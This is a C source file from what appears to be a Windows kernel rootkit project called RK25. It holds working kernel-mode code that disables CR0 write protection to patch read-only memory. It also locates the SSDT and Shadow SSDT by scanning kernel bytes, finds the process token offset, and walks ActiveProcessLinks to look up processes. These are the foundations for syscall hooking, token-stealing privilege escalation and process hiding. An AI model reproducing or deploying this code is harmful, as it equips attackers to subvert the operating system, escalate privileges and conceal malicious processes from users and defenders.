#pragma once
#include "rk25_kernel.h"

#define RK25_PROLOG_KERNEL	"Kernel Routine"
#define RK25_ALLOC_TAG_KRNL 'LNRK'

/*
* ⣿⣿⣿⣿⣿⣿⣿⠿⠿⢛⣋⣙⣋⣩⣭⣭⣭⣭⣍⣉⡛⠻⢿⣿⣿⣿⣿
* ⣿⣿⣿⠟⣋⣥⣴⣾⣿⣿⣿⡆⣿⣿⣿⣿⣿⣿⡿⠟⠛⠗⢦⡙⢿⣿⣿
* ⣿⡟⡡⠾⠛⠻⢿⣿⣿⣿⡿⠃⣿⡿⣿⠿⠛⠉⠠⠴⢶⡜⣦⡀⡈⢿⣿
* ⡿⢀⣰⡏⣼⠋⠁⢲⡌⢤⣠⣾⣷⡄⢄⠠⡶⣾⡀⠀⣸⡷⢸⡷⢹⠈⣿
* ⡇⢘⢿⣇⢻⣤⣠⡼⢃⣤⣾⣿⣿⣿⢌⣷⣅⡘⠻⠿⢛⣡⣿⠀⣾⢠⣿
* ⣷⠸⣮⣿⣷⣨⣥⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢁⡼⠃⣼⣿
* ⡟⠛⠛⠛⣿⠛⠛⢻⡟⠛⠛⢿⡟⠛⠛⡿⢻⡿⠛⡛⢻⣿⠛⡟⠛⠛⢿
* ⡇⢸⣿⠀⣿⠀⠛⢻⡇⠸⠃⢸⡇⠛⢛⡇⠘⠃⢼⣷⡀⠃⣰⡇⠸⠇⢸
* ⡇⢸⣿⠀⣿⠀⠛⢻⡇⢰⣿⣿⡇⠛⠛⣇⢸⣧⠈⣟⠃⣠⣿⡇⢰⣾⣿
* ⣿⣿⣿⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢋⣿⠙⣷⢸⣷⠀⣿⣿⣿
* ⣿⣿⣿⡇⢻⣿⣿⣿⡿⠿⢿⣿⣿⣿⠟⠋⣡⡈⠻⣇⢹⣿⣿⢠⣿⣿⣿
* ⣿⣿⣿⣿⠘⣿⣿⣿⣿⣯⣽⣉⣿⣟⣛⠷⠙⢿⣷⣌⠀⢿⡇⣼⣿⣿⣿
* ⣿⣿⣿⡿⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⡙⢿⢗⣀⣁⠈⢻⣿⣿
* ⣿⡿⢋⣴⣿⣎⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡉⣯⣿⣷⠆⠙⢿
* ⣏⠀⠈⠧⠡⠉⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠉⢉⣁⣀⣀⣾
*/

// Lock for mutli-processors workspace OS (not for multi-threads - irql can already be used for atomic operations)
KSPIN_LOCK glSysLock;

// Kernel
PVOID glKernelBase = NULL;
ULONG glKernelSize = 0;

// SSDT pointers
PKSERVICE_TABLE_DESCRIPTOR glSSDT = NULL;
PKSERVICE_TABLE_DESCRIPTOR glShadowSSDT = NULL;

// System _EPROCESS
PEPROCESS glSystemEProc = NULL;
// Offset to token for _EPROCESS
USHORT glOffsetToToken = 0;
// Offset to ActiveProcessLinks
USHORT glOffsetToAPL = 0;
PLIST_ENTRY glActiveProcessLinks = NULL;
PLIST_ENTRY glActiveProcessHead = NULL;


BOOLEAN RK25IsValidListEntry(PLIST_ENTRY Entry) {
	if (MmIsAddressValid(Entry))
		return (MmIsAddressValid(Entry->Flink) && MmIsAddressValid(Entry->Blink));
	else return FALSE;
}

#if defined(_M_X64)
BOOLEAN RK25IsAddressSystemRange(PVOID address) {
	if ((ULONG_PTR)address >= 0xFFFF080000000000 && (ULONG_PTR)address < 0xFFFFFFFFFFFFFFFF)
		return TRUE;
	return FALSE;
}

//KIRQL DisableWP() {
VOID DisableWP() {
	//KIRQL irql = KeRaiseIrqlToDpcLevel();
	UINT64 cr0 = __readcr0();
	cr0 &= 0xfffffffffffeffff;
	__writecr0(cr0);
	_disable();
	//return irql;
	return;
}

VOID EnableWP(IN KIRQL irql) {
	UINT64 cr0 = __readcr0();
	cr0 |= 0x10000;
	_enable();
	__writecr0(cr0);
	if (KeGetCurrentIrql() >= DISPATCH_LEVEL) {
		KeLowerIrql(irql);
	}
}

#elif defined(_M_IX86)
BOOLEAN RK25IsAddressSystemRange(PVOID address) {
	if ((ULONG_PTR)address >= 0x80000000)
		return TRUE;
	return FALSE;
}

//KIRQL DisableWP(void) {
VOID DisableWP(void) {
	ULONG reg = 0;
	//KIRQL irql = KeRaiseIrqlToDpcLevel();
	_disable();
	__asm {
		mov eax, cr0
		mov[reg], eax
		and eax, 0xFFFEFFFF // disable read-olny memory (MMU)d
		mov cr0, eax
	}
	//return irql;
	return;
}
void EnableWP(IN KIRQL irql) {
	ULONG reg = ~(0x10000);
	__asm {
		mov eax, cr0
		and eax, [reg]
		mov cr0, eax
	}
	//if (KeGetCurrentIrql() >= DISPATCH_LEVEL) {
	//	KeLowerIrql(irql);
	//}
	_enable();
}
#endif

/**
* @brief Copy memory to write-protected space
*
* @ref https://www.cyberark.com/resources/threat-research-blog/fantastic-rootkits-and-where-to-find-them-part-3-arm-edition
* @ref https://m0uk4.gitbook.io/notebooks/mouka/windowsinternal/ssdt-hook#disable-write-protection
*/
NTSTATUS RK25SuperCopyMemory(IN VOID UNALIGNED* Destination, IN CONST VOID UNALIGNED* Source, IN ULONG Length) {
	NTSTATUS status = STATUS_SUCCESS;
	KIRQL oldIrql;
	KeAcquireSpinLock(&glSysLock, &oldIrql); // up to DISPATCH_LEVEL

#if defined(_M_IX86)
	//KIRQL oldIrql = DisableWP();
	DisableWP();
	RtlCopyMemory(Destination, Source, Length);
	EnableWP(oldIrql);
#else
	//Change memory properties.
	PMDL pmdl = IoAllocateMdl(Destination, Length, 0, 0, NULL);
	if (!pmdl) {
		status = STATUS_MEMORY_NOT_ALLOCATED;
		goto fskip;
	}
	MmBuildMdlForNonPagedPool(pmdl);
	//unsigned int* Mapped = (unsigned int*)MmMapLockedPages(g_pmdl, KernelMode);
	UINT64* mapped = (UINT64*)MmMapLockedPagesSpecifyCache(pmdl, KernelMode, MmWriteCombined, NULL, FALSE, NormalPagePriority);
	if (!mapped) {
		status = STATUS_NONE_MAPPED;
		goto fmdl;
	}

	//KIRQL kirql = KeRaiseIrqlToDpcLevel();
	
	//RK25_DBG_INFO_F(RK25_PROLOG_KERNEL, "Writed %d bytes from [0x%p] to [0x%p]", Length, Source, Destination);
	/*
	* mb change RtlCopyMemory to InterlockedExchange and remove spinlock functionality
	*/
	RtlCopyMemory(mapped, Source, Length);

	//if (KeGetCurrentIrql() >= DISPATCH_LEVEL) {
	//	KeLowerIrql(kirql);
	//}
	
	//Restore memory properties.
	MmUnmapLockedPages((PVOID)mapped, pmdl);
fmdl:
	IoFreeMdl(pmdl);
fskip:
#endif
	KeReleaseSpinLock(&glSysLock, oldIrql);
	return status;
}

BOOLEAN RK25SearchPatternInMamory(
	PUCHAR pattern, ULONG len,			// pattern
	UCHAR ignore, BOOLEAN ignoring,		// ignore
	CONST PVOID memory, ULONG size,		// buffer
	PVOID* address, ULONG* offset) {	// out
	
	BOOLEAN found = FALSE;
	ULONG i, j;

	if (pattern && len && memory && size) {
		for (i = 0; i < size - len; ++i) {
			found = TRUE;
			for (j = 0; j < len; ++j) {
				if ((ignoring ? pattern[j] != ignore : !ignoring) && pattern[j] != ((PUCHAR)memory)[i + j]) {
					found = FALSE;
					break;
				}
			}
			if (found) {
				*address = (PUCHAR)memory + i;
				*offset = i;
				break;
			}
		}
	}
	return found;
}

VOID RK25OffsetTokenSearch(PEPROCESS sysproc) {
	if (!sysproc) return;

	PACCESS_TOKEN systoken = PsReferencePrimaryToken(sysproc);
	if (systoken) {
		PVOID address = NULL;
		ULONG offset = 0;
		/*
		* Search pattern address "struct _EX_FAST_REF Token" and skip last 1 byte
		* This can be improved by searching only for the last 4 bits
		*/
		if (RK25SearchPatternInMamory(((PUCHAR)&systoken + 1), sizeof(PACCESS_TOKEN) - 1, 0, FALSE, sysproc, 0x500, &address, &offset)){
			glOffsetToToken = offset - 1;
		}
	}
}

VOID RK25SearchAPLHead(PLIST_ENTRY apl, USHORT offset) {
	PLIST_ENTRY link = apl;
	/*
	* Search an unaligned address bc all _EPROCESS are aligned to 8-bit 
	*/
	while(!((ULONG_PTR)(((PUCHAR)link) - offset) & 0xF)) {
		link = link->Flink;
	}
	glActiveProcessHead = link;
}

VOID RK25EProcVarsSearch() {
	PEPROCESS proc = PsGetCurrentProcess();
	HANDLE pid = PsGetCurrentProcessId(); // returned 4

	PUCHAR address = (PUCHAR)proc, addressCheck = NULL;
	USHORT offset = 0, offsetCheck = 0;

	/*
	* kd> dt _EPROCESS
	* nt!_EPROCESS
	* +0x0000 Pcb                : _KPROCESS
	* +0xXXXX ProcessLock        : _EX_PUSH_LOCK
	* +0xXXXX UniqueProcessId	 : Ptr64 Void
	* +0xXXXX ActiveProcessLinks : _LIST_ENTRY
	* 
	* Find UniqueProcessId value and check LIST_ENTRY with offset (&UniqueProcessId)+sizeof(HANDLE)
	*/
	while (offset < 0x500) {
		if (RK25SearchPatternInMamory((PUCHAR)&pid, sizeof(HANDLE), 0, FALSE, (PVOID)address, 0x500 - offset, &addressCheck, &offsetCheck)) {
			address = addressCheck + sizeof(HANDLE);
			offset += offsetCheck + sizeof(HANDLE);
			if (RK25IsAddressSystemRange(address) && RK25IsValidListEntry(address)) {
				glSystemEProc = proc;
				glOffsetToAPL = offset;
				glActiveProcessLinks = (PLIST_ENTRY)(address);
				RK25SearchAPLHead((PUCHAR)proc + offset, offset);
				RK25OffsetTokenSearch(glSystemEProc);
				break;
			}
		}
		else break;
	}
}

VOID RK25SSDTSearch() {

#if defined(_M_IX86)
	UNICODE_STRING SSDTName;

	RtlInitUnicodeString(&SSDTName, L"KeServiceDescriptorTable");
	glSSDT = MmGetSystemRoutineAddress(&SSDTName);

	glShadowSSDT = (PKSERVICE_TABLE_DESCRIPTOR)((PUCHAR)glSSDT - 0x30); // Win10

#else
	PIMAGE_NT_HEADERS pImageNtHeaders;
	PIMAGE_SECTION_HEADER first, section;
	PVOID foundAddress = NULL;
	ULONG foundOffset;
	USHORT count;

	// KiSystemServiceRepeat (example dump)
	// fffff800`7e443064 4c8d1555489c00  lea     r10, [nt!KeServiceDescriptorTable(fffff800`7ee078c0)]
	// fffff800`7e44306b 4c8d1dce108e00  lea     r11, [nt!KeServiceDescriptorTableShadow(fffff800`7ed24140)]
	// fffff800`7e443072 f7437880000000  test    dword ptr[rbx + 78h], 80h
	UCHAR pattern[] = "\x4c\x8d\x15\xcc\xcc\xcc\xcc\x4c\x8d\x1d\xcc\xcc\xcc\xcc\xf7";

	if (!glKernelBase) return;

	pImageNtHeaders = RtlImageNtHeader(glKernelBase);
	first = (PIMAGE_SECTION_HEADER)(pImageNtHeaders + 1);
	count = pImageNtHeaders->FileHeader.NumberOfSections;
	for (section = first; section < first + count; ++section) {
		if (section->Characteristics & IMAGE_SCN_MEM_NOT_PAGED &&
			section->Characteristics & IMAGE_SCN_MEM_EXECUTE &&
			!(section->Characteristics & IMAGE_SCN_MEM_DISCARDABLE) &&
			(*(PULONG)section->Name != 'TINI') &&
			(*(PULONG)section->Name != 'EGAP')) {

			if (RK25SearchPatternInMamory(pattern, sizeof(pattern) - 1, 0xCC, TRUE,
				(PUCHAR)glKernelBase + section->VirtualAddress, section->Misc.VirtualSize,
				&foundAddress, &foundOffset)) {
				//RK25_DBG_INFO_F(RK25_PROLOG_KERNEL, "Match found: 0x%p (offset: 0x%X)", foundAddress, foundOffset);

				// how it work?
				// 1 +3 bytes to skip opcode lea (shadow: +3 first opcode lea +4 offset operand +3 second opcode lea) and save value as PULONG (8 bytes) pointer
				// 2. Deference pointer and add ULONG (4 bytes) offset to address
				// 3. +7 bytes (shadow: +14) for skip sizeof opcode lea and offset
				glSSDT = (PKSERVICE_TABLE_DESCRIPTOR)((PUCHAR)foundAddress + *(PULONG)((PUCHAR)foundAddress + 3) + 7);
				glShadowSSDT = (PKSERVICE_TABLE_DESCRIPTOR)((PUCHAR)foundAddress + *(PULONG)((PUCHAR)foundAddress + 10) + 14);
				break;
			}

		}
	}
#endif
}

NTSTATUS RK25InitializeKernelRoutine() {
	NTSTATUS status = STATUS_SUCCESS;
	PRTL_PROCESS_MODULES pRtlProcessModules = NULL;
	PRTL_PROCESS_MODULE_INFORMATION pRtlProcessModule = NULL;
	PVOID syscallAddress = NULL;
	ULONG bytes = 0, i;
	UNICODE_STRING syscallName;

	RtlInitUnicodeString(&syscallName, L"NtOpenFile");
	syscallAddress = MmGetSystemRoutineAddress(&syscallName);
	if (!syscallAddress) {
		RK25_DBG_ERR(RK25_PROLOG_KERNEL, "Error get address NtOpenFile");
		return STATUS_NOT_FOUND;
	}

	// Get size buffer
	status = ZwQuerySystemInformation(SystemModuleInformation, 0, bytes, &bytes);
	if (!bytes) { // status is not checked bc passed 0 as a buffer (status will be C0000004)
		RK25_DBG_ERR_F(RK25_PROLOG_KERNEL, "Error get SystemModuleInformation: %d bytes returned with status:%X)",
			bytes, status);
		return STATUS_UNSUCCESSFUL;
	}

	pRtlProcessModules = (PRTL_PROCESS_MODULES)ExAllocatePoolWithTag(NonPagedPool, bytes, RK25_ALLOC_TAG_KRNL);
	if (!pRtlProcessModules) {
		RK25_DBG_ERR_F(RK25_PROLOG_KERNEL, "Error allocation for %d bytes", bytes);
		return STATUS_MEMORY_NOT_ALLOCATED;
	}
	RtlZeroMemory(pRtlProcessModules, bytes);

	status = ZwQuerySystemInformation(SystemModuleInformation, pRtlProcessModules, bytes, &bytes);
	if (!NT_SUCCESS(status)) {
		ExFreePool(pRtlProcessModules);
		RK25_DBG_ERR_F(RK25_PROLOG_KERNEL, "Error get SystemModuleInformation: %d bytes returned with status:%X)",
			bytes, status);
		return STATUS_NOT_FOUND;
	}

	pRtlProcessModule = pRtlProcessModules->Modules;
	for (i = 0; i < pRtlProcessModules->NumberOfModules; ++i) {
		// Detect nt address space
		if (syscallAddress >= pRtlProcessModule[i].ImageBase &&
			syscallAddress < (PVOID)((PUCHAR)pRtlProcessModule[i].ImageBase + pRtlProcessModule[i].ImageSize)) {
			glKernelBase = pRtlProcessModule[i].ImageBase;
			glKernelSize = pRtlProcessModule[i].ImageSize;
			break;
		}
	}
	ExFreePool(pRtlProcessModules);

	if (!glKernelBase) {
		RK25_DBG_WARN(RK25_PROLOG_KERNEL, "KernelBase is not found");
		return STATUS_NOT_FOUND;
	}
	RK25SSDTSearch();
	RK25EProcVarsSearch();

	KeInitializeSpinLock(&glSysLock); // for RK25SuperCopyMemory
	return status;
}

PVOID RK25GetKernelBaseAddress() {
	if (glKernelBase) return glKernelBase;

	if (!NT_SUCCESS(RK25InitializeKernelRoutine())) return NULL;
	return glKernelBase;
}

ULONG RK25GetKernelSize() {
	return glKernelSize;
}

PVOID RK25GetSSDTAddress() {
	if (glSSDT) return glSSDT;

	RK25SSDTSearch();

	if (!glSSDT) RK25_DBG_WARN(RK25_PROLOG_KERNEL, "SSDT pointer is not found");
	return glSSDT;
}

PVOID RK25GetSSDTShadowAddress() {
	if (glShadowSSDT) return glShadowSSDT;

	RK25SSDTSearch();

	if (!glSSDT) RK25_DBG_WARN(RK25_PROLOG_KERNEL, "SSDT Shadow pointer is not found");
	return glShadowSSDT;
}

PEPROCESS RK25GetSystemEProcAddress() {
	if (glSystemEProc) return glSystemEProc;

	RK25EProcVarsSearch();

	return glSystemEProc;
}

USHORT RK25GetOffsetToToken() {
	if (glOffsetToToken) return glOffsetToToken;

	RK25EProcVarsSearch();

	return glOffsetToToken;
}

PVOID RK25GetPTokenOfEProc(PEPROCESS proc) {
	if (!proc) return NULL;

	USHORT offset = RK25GetOffsetToToken();
	if (!offset) return NULL;
	
	return (PVOID)((ULONG_PTR)((PUCHAR)proc + offset));
}

USHORT RK25GetOffsetToAPL() {
	if (glOffsetToAPL) return glOffsetToAPL;
	
	RK25EProcVarsSearch();
	
	return glOffsetToAPL;
}

PVOID RK25GetActiveProcessLinks() {
	if (glActiveProcessLinks) return glActiveProcessLinks;

	RK25EProcVarsSearch();

	return glActiveProcessLinks;
}

PVOID RK25GetActiveProcessHead() {
	if (glActiveProcessHead) return glActiveProcessHead;

	RK25EProcVarsSearch();

	return glActiveProcessHead;
}

PEPROCESS RK25SearchEProcByAPL(PLIST_ENTRY entry) {
	PEPROCESS proc = NULL;
	if (glActiveProcessHead && glOffsetToAPL) {
		for (PLIST_ENTRY link = glActiveProcessHead->Flink; link != glActiveProcessHead; link = link->Flink) {
			if (link == entry) {
				proc = RK25_APL_TO_EPROC(entry, glOffsetToAPL);
				break;
			}
		}
	}
	return proc;
}

PEPROCESS RK25SearchEProcByPID(HANDLE pid) {
	PEPROCESS proc = NULL;
	if (glActiveProcessHead && glOffsetToAPL) {
		for (PLIST_ENTRY link = glActiveProcessHead->Flink; link != glActiveProcessHead; link = link->Flink) {
			if (*(PHANDLE)((PUCHAR)link - sizeof(HANDLE)) == pid) {
				proc = RK25_APL_TO_EPROC(link, glOffsetToAPL);
				break;
			}
		}
	}
	return proc;
}

PEPROCESS RK25SearchEProcByName(PUNICODE_STRING name) {
	PEPROCESS proc = NULL;
	if (glActiveProcessHead && glOffsetToAPL) {
		for (PLIST_ENTRY link = glActiveProcessHead->Flink; link != glActiveProcessHead; link = link->Flink) {
			proc = RK25_APL_TO_EPROC(link, glOffsetToAPL);
			//RK25_DBG_INFO_F(RK25_PROLOG_KERNEL, "PROC:0x%p\tAPL:0x%p\tPATH:%wZ", proc, link, *unic);
			PUNICODE_STRING unic;
			if (NT_SUCCESS(SeLocateProcessImageName(proc, &unic))) {
				UNICODE_STRING subunic;
				USHORT index = unic->Length / sizeof(WCHAR);
				while (index > 0) {
					if (unic->Buffer[index - 1] == L'\\') {
						break;
					}
					index--;
				}
				subunic.Buffer = unic->Buffer + index;
				subunic.Length = unic->Length - (index * sizeof(WCHAR));
				subunic.MaximumLength = unic->MaximumLength - (index * sizeof(WCHAR));

				//RK25_DBG_INFO_F(RK25_PROLOG_KERNEL, "PROC:0x%p\tAPL:0x%p\tNAME:%wZ", proc, link, subunic);

				BOOLEAN found = RtlEqualUnicodeString(&subunic, name, TRUE);
				RtlFreeUnicodeString(unic);
				if (found)
					break;
			}
			proc = NULL;
		}
	}
	return proc;
}

VOID RK25PrintSSDTByIndex(PKSERVICE_TABLE_DESCRIPTOR table, ULONG index) {
	ULONG i;

	for (i = 0; i < 4; ++i) {
		RK25_DBG_PRINTF("Base:0x%p\tLimit:0x%lx\tNumber:0x%p\n", table[i].Base, table[i].Limit, table[i].Number);
	}
	return;
}

HANDLE GetPidFromHandle(HANDLE ProcessHandle) {
	PEPROCESS eProcess;
	HANDLE pid = 0;
	NTSTATUS status = ObReferenceObjectByHandle(
		ProcessHandle,          // Дескриптор процесса
		PROCESS_QUERY_LIMITED_INFORMATION, // Минимальные права
		*PsProcessType,         // Тип объекта (процесс)
		KernelMode,             // Режим доступа
		(PVOID*)&eProcess,      // Указатель на _EPROCESS
		NULL
	);

	if (NT_SUCCESS(status)) {
		pid = PsGetProcessId(eProcess);
		ObDereferenceObject(eProcess);
	}
	return pid;
}